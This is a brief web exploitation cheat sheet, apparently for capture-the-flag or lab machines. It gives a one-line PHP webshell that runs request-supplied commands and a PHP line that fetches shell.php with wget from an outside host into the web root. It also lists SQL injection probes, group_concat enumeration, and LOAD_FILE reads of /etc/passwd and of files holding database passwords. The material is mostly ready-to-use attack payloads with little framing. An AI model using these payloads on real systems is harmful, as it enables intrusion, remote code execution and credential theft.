# Web exploitation

## PHP webshell

```php
<?php echo system($_REQUEST ['cmd']); ?>
```

Or alternatively, have it download a file to directory served by the Webserver

```php
<?php exec("wget http://10.10.14.78/shell.php -O /var/www/html/shell.php"); ?>
```
## Downloading image files

`wget`, unlike Firefox doesn't strip out metadata from image files. So this preserves some additional `exiftool` data like file modified dates.

## Virtual host config

1. When you have `Assign User-ID` in vhost config and a shell, can upload a Webshell to achieve RCE under a different user, see OpenAdmin for eg.

## SQL Injection

Can try
```plaintext
?cod=1+2
```
to see if SQL actually evaluates the math to load `?cod=3`

### group_concat

Can group output with group_concat with 
`group_concat(TABLE_NAME,":",COLUMN_NAME,)`
to show

```
db:User
db:Host
```

### LOAD_FILE() LFI

May want to wrap `LOAD_FILE()` with `TO_base64(LOAD_FILE("/etc/passwd"))` so that it it converts everything to base64 instead of trying to display it which may execute code and prevent displaying.

Consider LFI to view PHP code containing MySQL password in plaintext instead of 
```sql
SELECT user FROM mysql.user;
```
which requires the Web app user be sufficiently privileged to query that.